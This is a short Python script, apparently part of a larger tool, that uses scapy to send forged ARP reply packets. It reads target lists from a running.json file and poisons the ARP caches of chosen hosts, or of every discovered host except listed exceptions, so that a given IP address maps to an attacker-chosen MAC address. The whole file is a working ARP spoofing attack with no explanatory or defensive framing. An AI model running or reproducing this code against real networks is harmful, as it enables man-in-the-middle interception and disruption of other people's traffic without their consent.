from scapy.all import send
from scapy.layers.l2 import ARP, getmacbyip
from bin import read , get_ip
def sendARP(ot,ip,mac):
    arp = ARP(op=2, pdst=ot,hwdst=getmacbyip(ot),psrc=ip,hwsrc=mac)
    send(arp,verbose=False)
def kernel():
    reads = read("./running.json")
    for i in range(int(reads["number"])):
        if reads[str(i+1)]["except"] == "True":
            t_ip,t_mac,t_name = get_ip()
            if not isinstance(reads[str(i+1)]["for"],list):
                forc = [reads[str(i+1)]["for"]]
            else:
                forc = reads[str(i+1)]["for"]
            for x in t_ip:
                if x not in forc:
                    sendARP(x,reads[str(i+1)]["ip"],reads[str(i+1)]["mac"])
        else:
            if not isinstance(reads[str(i+1)]["for"],list):
                forc = [reads[str(i+1)]["for"]]
            else:
                forc = reads[str(i+1)]["for"]
            for x in forc:
                sendARP(x,reads[str(i+1)]["ip"],reads[str(i+1)]["mac"])